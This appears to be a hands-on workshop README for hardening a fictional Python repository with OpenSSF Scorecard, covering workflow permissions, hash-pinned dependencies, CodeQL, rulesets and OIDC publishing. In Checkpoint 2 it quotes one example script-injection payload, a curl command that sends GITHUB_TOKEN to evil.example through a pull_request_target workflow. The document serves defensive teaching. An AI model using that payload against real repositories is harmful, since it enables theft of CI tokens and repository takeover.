# OpenSSF Scorecard Supply-Chain Security Workshop

Welcome! In this 90-minute hands-on workshop, you will take **`cronk`**—a fictional Python crontab-to-JSON translator written by Cottonwood University student Alice Doe—from an unhardened baseline (`~1.2 / 10`) to a hardened, supply-chain-secure repository (`~8.3 / 10`) using **[OpenSSF Scorecard](https://securityscorecards.dev/)**.

Along the way, you will identify and remediate real-world software supply-chain vulnerabilities: opaque checked-in binaries, GitHub Actions script injection and over-privileged `GITHUB_TOKEN` permissions, mutable third-party Action tags, unpinned and vulnerable PyPI dependencies, missing static analysis (SAST) and CI gating, unprotected default branches, and long-lived package registry API tokens.

---

## Pre-Flight Setup (5 Minutes)

### Step 1: Create Your Own Copy of `cronk-template`

1. At the top right of this GitHub repository, click **Use this template** -> **Create a new repository**.
2. Choose a repository name (for example, `cronk`).
3. Select **Public** visibility.
4. Check **Include all branches**.
5. Click **Create repository**.

> [!IMPORTANT]
> **Why both checkboxes matter:**
> - **Public visibility** is required so GitHub Actions provides free runners, CodeQL code scanning, GitHub Repository Rulesets, and OpenSSF Scorecard result publishing (`scorecard.dev/viewer`).
> - **Include all branches** copies the pre-built fallback branches (`workshop/checkpoint-1` through `workshop/checkpoint-5`) into your repository so you can catch up immediately if you ever fall behind.

### Step 2: Choose Your Working Environment

You can complete every checkpoint using **either** of two tracks:

- **Track A (Recommended — GitHub Codespaces or Local Terminal):**
  Click **Code -> Codespaces -> Create codespace on main** (or `git clone` your repository locally). Each checkpoint is staged with a single command:
  ```sh
  ./.workshop/apply-checkpoint.sh <1|2|3|4|5>
  ```
- **Track B (Browser-Only — `github.dev` Web Editor):**
  Press `.` (the period key) on your GitHub repository page to open the browser-based VS Code editor (`github.dev`), and copy the pre-staged files from `.workshop/checkpoint-<N>/*.tmpl` to their target locations.

> [!NOTE]
> Why do files in `.workshop/checkpoint-<N>/` end in `.tmpl`? OpenSSF Scorecard recursively scans the entire repository tree for `*requirements*.txt`, `SECURITY.md`, `LICENSE`, and `.github/workflows/*.yml`. Using `.tmpl` keeps the staged templates invisible to scanners until you activate each checkpoint.

---

## Checkpoint 1: Baseline Supply-Chain Audit (~15 Minutes)

Before changing any application or build configuration, we will install the **OpenSSF Scorecard GitHub Action** to measure our starting security posture.

### 1. Stage the Scorecard Workflow

**Track A (Codespaces / Terminal):**
```sh
./.workshop/apply-checkpoint.sh 1
git diff --staged
```

**Track B (`github.dev` Browser Editor):**
Copy:
- `.workshop/checkpoint-1/scorecard.yml.tmpl` -> `.github/workflows/scorecard.yml`
- `.workshop/checkpoint-1/render_scorecard_summary.py.tmpl` -> `.github/workflows/scripts/render_scorecard_summary.py`

### 2. Inspect What You Staged

Open `.github/workflows/scorecard.yml` and note three security practices already applied in the audit workflow itself:
- Top-level `permissions: read-all` restricts the default `GITHUB_TOKEN`, while job-level permissions grant only `security-events: write` and `id-token: write`.
- Every GitHub Action (`actions/checkout`, `ossf/scorecard-action`, `actions/upload-artifact`, `github/codeql-action/upload-sarif`, `actions/download-artifact`) is pinned to an immutable 40-character commit SHA.
- A second job (`summary`) runs `.github/workflows/scripts/render_scorecard_summary.py` to parse the generated SARIF report and query the Scorecard API, writing a complete check-by-check table directly into your GitHub Actions Run Summary (`$GITHUB_STEP_SUMMARY`).

### 3. Commit, Push, and Read Your Baseline Score

```sh
git commit -m "Checkpoint 1: Add OpenSSF Scorecard workflow"
git push -u origin main
```

1. Open the **Actions** tab in your GitHub repository and click the running **Scorecard supply-chain security** workflow.
2. Once it completes (~90 seconds), scroll down to the **Summary** section of the workflow run to inspect your **OpenSSF Scorecard Supply-Chain Security Report** table (and click the **`scorecard.dev/viewer`** link at the top of the summary).
3. Also visit **Security -> Code scanning** to see how SARIF alerts appear in GitHub's native security dashboard.

### Expected Baseline Scorecard Results (`~1.2 / 10`)

| Check | Baseline Score | Why It Fails in `cronk` Right Now |
| :--- | :---: | :--- |
| `Binary-Artifacts` | `0 / 10` | `bin/cronk-helper` (a compiled 64-bit ELF binary) is checked directly into Git. |
| `Dangerous-Workflow` | `0 / 10` | `.github/workflows/awesome-action.yml` uses `pull_request_target` and interpolates `${{ github.event.pull_request.body }}` directly inside a `run:` shell script. |
| `Token-Permissions` | `0 / 10` | `.github/workflows/awesome-action.yml` sets `permissions: write-all`. |
| `Pinned-Dependencies` | `0 / 10` | `awesome-action.yml` uses mutable tag `actions/checkout@v4`, and `requirements.txt` lacks `--hash=sha256:...` digests. |
| `Vulnerabilities` | `8 / 10` | `requirements.txt` pins `babel==2.9.0` (`CVE-2021-42771`) and `loguru==0.5.2` (`CVE-2022-0329`). |
| `License` | `0 / 10` | No `LICENSE` file exists in the repository root. |
| `Security-Policy` | `0 / 10` | No `SECURITY.md` vulnerability disclosure policy exists. |
| `Branch-Protection` | `0 / 10` | `main` allows direct pushes, force-pushes, and branch deletion. |
| `SAST` | `0 / 10` | No static analysis tool (such as CodeQL) is configured. |
| `Dependency-Update-Tool` | `0 / 10` | Neither Dependabot nor Renovate is configured. |
| `CI-Tests` | `-1` (Skipped) | No Pull Requests have been merged yet (`totalMerged == 0`). |
| `Packaging` | `-1` (Skipped) | No automated package publishing workflow has succeeded yet. |

---

## Checkpoint 2: Quick Wins, Workflow Hardening & Solo Governance (~20 Minutes)

In Checkpoint 2, we eliminate the most severe immediate attack vectors on `main` and then protect `main` with a **0-approver GitHub Repository Ruleset** before opening our first Pull Request in Checkpoint 3.

### 1. Investigate the Checked-in Binary and Dangerous Workflow

1. Inspect `src/cronk-helper/cronk_helper.c` and `src/cronk-helper/compile.sh`.
   Notice that `bin/cronk-helper` is compiled from a 6-line C source file using `gcc -O2 -Wall -o ../../bin/cronk-helper cronk_helper.c`. Checking the pre-compiled ELF binary into Git makes it opaque to code review—an attacker could slip a backdoor into `bin/cronk-helper` that does not exist in `cronk_helper.c`. Because anyone can compile it from source on demand via `./src/cronk-helper/compile.sh`, `bin/cronk-helper` should be removed from version control while keeping `src/cronk-helper/`.
2. Inspect `.github/workflows/awesome-action.yml`:
   - `pull_request_target` runs in the context of the base repository with write access and secrets.
   - `echo "Checking PR: ${{ github.event.pull_request.body }}"` allows any external attacker who opens a Pull Request with `"; curl https://evil.example/exfil -d "$GITHUB_TOKEN` in the PR description to execute arbitrary shell commands with `permissions: write-all`.

### 2. Apply Checkpoint 2 and Push to `main`

**Track A (Codespaces / Terminal):**
```sh
./.workshop/apply-checkpoint.sh 2
git diff --staged
git commit -m "Checkpoint 2: Remove binary artifact and dangerous workflow, add LICENSE and SECURITY.md"
git push origin main
```

**Track B (`github.dev` Browser Editor):**
1. Delete `bin/cronk-helper` (keep `src/cronk-helper/cronk_helper.c` and `src/cronk-helper/compile.sh`).
2. Delete `.github/workflows/awesome-action.yml`.
3. Copy `.workshop/checkpoint-2/LICENSE.tmpl` -> `LICENSE` and `.workshop/checkpoint-2/SECURITY.md.tmpl` -> `SECURITY.md`.
4. Commit and push to `main`.

### 3. Configure a 0-Approver GitHub Repository Ruleset on `main`

> [!IMPORTANT]
> **Why we enable Branch Protection now (at the end of Checkpoint 2):**
> OpenSSF Scorecard calculates `CI-Tests` and `SAST` proportionally across **all merged Pull Requests** (`totalTested / totalMerged`). Because Checkpoints 1 and 2 were pushed directly to `main`, your repository currently has `0` merged PRs. By enabling a Repository Ruleset now, **Pull Request #1 in Checkpoint 3 will be the very first merged PR in your repository**, allowing it to achieve `1/1 = 100%` (`10/10`)!
>
> Furthermore, unlike legacy Branch Protection rules (which return `HTTP 403` to the default `GITHUB_TOKEN`), **GitHub Repository Rulesets** are readable by the default `GITHUB_TOKEN` without needing a Personal Access Token.

Follow these steps in your GitHub repository UI:

1. Go to **Settings** -> **Rules** -> **Rulesets** (in the left sidebar under *Code and automation*).
2. Click **New ruleset** -> **New branch ruleset**.
3. **Ruleset Name:** `Protect main`
4. **Enforcement status:** Set to **Active** (important—it defaults to *Disabled*!).
5. Under **Target branches**, click **Add target** -> **Include default branch**.
6. Under **Branch rules**, check:
   - **Restrict deletions** (checked by default)
   - **Block force pushes** (checked by default)
   - **Require a pull request before merging**
     - Set **Required approvals** to **`0`** *(so you can merge your own Pull Requests solo during this workshop without needing a second GitHub user)*.
     - Check **Dismiss stale pull request approvals when new commits are pushed**.
7. Scroll to the bottom and click **Create**.

### Expected Checkpoint 2 Scorecard Delta (`~1.2 -> ~4.5 / 10`)

| Check | Before | After | Attack Mitigated |
| :--- | :---: | :---: | :--- |
| `Binary-Artifacts` | `0 / 10` | `10 / 10` | Eliminates unverifiable pre-compiled binaries from source control. |
| `Dangerous-Workflow` | `0 / 10` | `10 / 10` | Eliminates `pull_request_target` untrusted input shell injection. |
| `Token-Permissions` | `0 / 10` | `10 / 10` | Enforces least-privilege `GITHUB_TOKEN` permissions across workflows. |
| `License` | `0 / 10` | `10 / 10` | Declares an explicit FSF/OSI-approved software license (`Apache-2.0`). |
| `Security-Policy` | `0 / 10` | `10 / 10` | Publishes private vulnerability reporting instructions (`SECURITY.md`). |
| `Branch-Protection` | `0 / 10` | `6 / 10` | Blocks force-pushes and branch deletion and requires Pull Requests on `main`. |

---

## Checkpoint 3: CI Tests, CodeQL SAST & Hash-Pinned Dependencies via PR #1 (~25 Minutes)

Now that `main` requires Pull Requests, we will open **Pull Request #1** to add continuous integration (`testing.yml`), CodeQL static analysis (`codeql.yml`), automated dependency updates (`dependabot.yml`), and SHA-256 hash-pinned Python 3.15 dependency lockfiles (`requirements.txt` and `.github/workflows/requirements/testing.txt`).

### 1. Stage Checkpoint 3 on Branch `checkpoint-3`

**Track A (Codespaces / Terminal):**
```sh
./.workshop/apply-checkpoint.sh 3
git diff --staged
```

**Track B (`github.dev` Browser Editor):**
1. Create and switch to a new branch named `checkpoint-3`.
2. Copy the following templates from `.workshop/checkpoint-3/`:
   - `testing.yml.tmpl` -> `.github/workflows/testing.yml`
   - `codeql.yml.tmpl` -> `.github/workflows/codeql.yml`
   - `dependabot.yml.tmpl` -> `.github/dependabot.yml`
   - `pyproject.toml.tmpl` -> `pyproject.toml`
   - `requirements.in.tmpl` -> `requirements.in`
   - `requirements.txt.tmpl` -> `requirements.txt`
   - `testing.in.tmpl` -> `.github/workflows/requirements/testing.in`
   - `testing-requirements.txt.tmpl` -> `.github/workflows/requirements/testing.txt`
   - `cron_to_json.py.tmpl` -> `src/cronk/cron_to_json.py`

### 2. Inspect Key Supply-Chain Details in Your Diff

1. **Upgraded & Hash-Pinned `requirements.txt`:**
   - Upgrades `babel==2.9.0` (vulnerable to `CVE-2021-42771` arbitrary locale code execution) to `babel==2.17.0` and `loguru==0.5.2` (`CVE-2022-0329`) to `loguru==0.7.3`.
   - Every package includes `--hash=sha256:...` digests, and `.github/workflows/testing.yml` runs `pip install -r ... --require-hashes`. If PyPI or a mirror is compromised, `pip` aborts immediately on any digest mismatch.
2. **Why `testing.yml` Passes `--no-deps --no-build-isolation` to `pip install -e .`:**
   - OpenSSF Scorecard parses every shell command in `.github/workflows/*.yml` into an AST. A bare `pip install -e .` triggers Scorecard's unpinned-install detector because `pip` would resolve dependencies without `--require-hashes`. Installing the hash-pinned lockfiles first and running `pip install --no-deps --no-build-isolation -e .` achieves `10/10` on `Pinned-Dependencies`.
3. **Remediating the Seeded CodeQL Alert in `src/cronk/cron_to_json.py`:**
   - Removes the unused `import os` in `src/cronk/cron_to_json.py` that CodeQL's `security-and-quality` suite flags.

### 3. Push `checkpoint-3`, Open Pull Request #1, and Wait for Checks Before Merging

```sh
git commit -m "Checkpoint 3: Add CI tests, CodeQL SAST, Dependabot, and hash-pinned dependencies"
git push -u origin checkpoint-3
```

1. In your GitHub repository, click **Compare & pull request** to open **Pull Request #1** from `checkpoint-3` into `main`.
2. **WAIT (~90 seconds)** on the Pull Request page until both check suites finish with green checkmarks:
   - `Python package / build`
   - `CodeQL / Analyze`

> [!WARNING]
> **Do not merge Pull Request #1 before `Python package` and `CodeQL` finish!**
> Scorecard checks whether merged PR commits have completed `CheckRun` entries for CI tests and `github-code-scanning`. Merging after both turn green guarantees `1/1 = 100%` (`10/10` on both `CI-Tests` and `SAST`).

3. Once both checks are green, click **Merge pull request** -> **Confirm merge**.
4. Switch your local checkout back to `main` and pull the merged commit:
   ```sh
   git checkout main
   git pull origin main
   ```

### Expected Checkpoint 3 Scorecard Delta (`~4.5 -> ~7.8 / 10`)

| Check | Before | After | Attack Mitigated |
| :--- | :---: | :---: | :--- |
| `Vulnerabilities` | `8 / 10` | `10 / 10` | Remediates known CVEs (`CVE-2021-42771`, `CVE-2022-0329`) detected by OSV-Scanner. |
| `Pinned-Dependencies` | `0 / 10` | `10 / 10` | Pins all GitHub Actions to 40-char SHAs and all `pip` installs to SHA-256 digests. |
| `Dependency-Update-Tool` | `0 / 10` | `10 / 10` | Automates weekly vulnerability and version updates via Dependabot. |
| `CI-Tests` | `-1` | `10 / 10` | Verifies 100% of merged Pull Requests (`1/1`) execute automated test suites. |
| `SAST` | `0 / 10` | `10 / 10` | Runs CodeQL static analysis on every push and Pull Request (`1/1`). |

---

## Checkpoint 4: Trusted Release Packaging with OIDC (~15 Minutes)

Traditionally, maintainers published packages to PyPI by generating a long-lived API token and storing it in a GitHub repository secret (`PYPI_API_TOKEN`). If leaked, that static token allowed attackers to publish malicious versions indefinitely.

Modern ecosystems use **OpenID Connect (OIDC) Trusted Publishing**: GitHub Actions mints a short-lived cryptographic OIDC token (`permissions: id-token: write`) that PyPI verifies directly against your repository and workflow identity—zero stored secrets required.

### 1. Stage Checkpoint 4 on Branch `checkpoint-4`

**Track A (Codespaces / Terminal):**
```sh
./.workshop/apply-checkpoint.sh 4
git diff --staged
```

**Track B (`github.dev` Browser Editor):**
1. Create and switch to a new branch named `checkpoint-4` from `main`.
2. Copy:
   - `.workshop/checkpoint-4/build.in.tmpl` -> `.github/workflows/requirements/build.in`
   - `.workshop/checkpoint-4/build-requirements.txt.tmpl` -> `.github/workflows/requirements/build.txt`
   - `.workshop/checkpoint-4/release.yml.tmpl` -> `.github/workflows/release.yml`

### 2. Inspect `.github/workflows/release.yml`

Notice how `release.yml` is designed:
- It installs `.github/workflows/requirements/build.txt` with `--require-hashes` (containing only `build`, `packaging`, `pyproject-hooks`, `setuptools`, and `wheel`—omitting legacy `twine` and its 20+ transitive dependencies).
- It builds the wheel and source distribution hermetically with `python -m build --no-isolation`.
- It declares `id-token: write` and invokes `pypa/gh-action-pypi-publish` with a dry-run guard:
  ```yaml
  if: vars.ENABLE_PYPI_PUBLISH == 'true'
  ```
  This allows you to execute the `Release` workflow end-to-end in class via `workflow_dispatch` without needing to register a TestPyPI account, while satisfying Scorecard's `Packaging` probe (which verifies both the presence of `pypa/gh-action-pypi-publish` and a successful run of `release.yml`).

### 3. Open & Merge Pull Request #2, Then Trigger `Release` and `Scorecard`

```sh
git commit -m "Checkpoint 4: Add OIDC release packaging workflow and hash-pinned build requirements"
git push -u origin checkpoint-4
```

1. Open **Pull Request #2** from `checkpoint-4` into `main`.
2. **Wait for `Python package` and `CodeQL` checks to pass**, then click **Merge pull request**.
3. Go to **Actions** -> **Release** -> click **Run workflow** dropdown -> click **Run workflow** (on `main`).
4. Wait ~30 seconds for the **Release** workflow run to finish with a green checkmark (`conclusion: success`).
5. Go to **Actions** -> **Scorecard supply-chain security** -> click **Run workflow** dropdown -> click **Run workflow**.
6. Open the completed **Scorecard supply-chain security** run summary to view your final workshop score!

### Expected Checkpoint 4 Scorecard Delta (`~7.8 -> ~8.3 / 10`)

| Check | Before | After | Attack Mitigated |
| :--- | :---: | :---: | :--- |
| `Packaging` | `-1` (Skipped) | `10 / 10` | Builds release distributions in ephemeral CI runners and publishes via OIDC instead of developer laptops. |
| `Signed-Releases` | `-1` (Skipped) | `-1` (Skipped) | Excluded from denominator until a GitHub Release is published (covered in Optional Checkpoint 5). |

---

## Checkpoint 5 (Optional Stretch Goal): SLSA Level 3 Build Provenance (~15 Minutes)

If you finish early, you can complete Checkpoint 5 to generate cryptographic **[SLSA Level 3](https://slsa.dev/)** provenance attestations (`.intoto.jsonl`) attached to a GitHub Release, advancing `Signed-Releases` to `10 / 10`.

1. Switch back to `main`, pull the latest changes, and stage Checkpoint 5:
   ```sh
   git checkout main
   git pull origin main
   ./.workshop/apply-checkpoint.sh 5
   git diff --staged
   ```
2. Commit, push `checkpoint-5`, open **Pull Request #3**, wait for green CI/CodeQL checks, and merge:
   ```sh
   git commit -m "Checkpoint 5: Add SLSA Level 3 provenance generation to release workflow"
   git push -u origin checkpoint-5
   ```
3. After merging Pull Request #3 into `main`, tag and push `v0.0.1` (matching `version = "0.0.1"` in `pyproject.toml`):
   ```sh
   git checkout main
   git pull origin main
   git tag v0.0.1
   git push origin v0.0.1
   ```
4. Wait for the **Release** workflow (triggered by `v0.0.1`) to run the isolated `slsa-framework/slsa-github-generator` builder and upload `provenance-cronk-v0.0.1.intoto.jsonl` to your new GitHub Release, then trigger **Scorecard supply-chain security** via **Run workflow** to see `Signed-Releases: 10 / 10`!

---

## Debrief: "Why Isn't My Overall Score 10.0?"

After completing Checkpoints 1–4 (and optional Checkpoint 5), every technical supply-chain control under a solo developer's control scores `10 / 10`. The remaining gap between `~8.3 / 10` and `10.0 / 10` comes from **social and longitudinal checks** that intentionally cannot be faked in a 90-minute solo workshop:

| Check | Workshop Score | Why It Cannot Be `10 / 10` in a Solo Workshop Repo | How Real Open-Source Projects Satisfy It |
| :--- | :---: | :--- | :--- |
| `Maintained` | `0 / 10` | Scorecard automatically scores `0/10` for any repository created less than 90 days ago. | Sustain >=1 commit or issue update per week over a 90-day window. |
| `Contributors` | `0 / 10` | Only 1 GitHub user/organization has contributed commits. | Attract contributors from >=3 distinct organizations. |
| `Code-Review` | `0 / 10` | We set **Required approvals = 0** so you could merge PRs solo without a second GitHub user. | Require >=1 independent human code review approval on every Pull Request. |
| `Branch-Protection` | `6–8 / 10` | Reaching `10/10` requires >=1 required approver and required status check enforcement on administrators. | Set Required approvals >= 1 and add required status checks (`build`, `Analyze (python)`) in the Ruleset. |
| `Fuzzing` / `CII-Best-Practices` | `0 / 10` | Out of scope for the 90-minute core session. | Integrate OSS-Fuzz / ClusterFuzzLite and complete the OpenSSF Best Practices badge questionnaire. |

---

## Falling Behind? Catching Up via Pre-Built Checkpoint Branches

Because you checked **Include all branches** when creating your repository from the template, your repository already contains pre-built backup branches (`origin/workshop/checkpoint-1` through `origin/workshop/checkpoint-5`)—or local branches `workshop/checkpoint-1` through `workshop/checkpoint-5`.

To jump your `main` branch directly to the completed state of any checkpoint `<N>`:

```sh
git fetch origin
git checkout main
git reset --hard origin/workshop/checkpoint-2   # Replace 2 with 1, 2, 3, 4, or 5
git push --force-with-lease origin main
```

*(Note: If you have already enabled the `Protect main` Ruleset in Checkpoint 2, temporarily set its Enforcement status to **Disabled** in `Settings -> Rules -> Rulesets` before force-pushing, then set it back to **Active**.)*
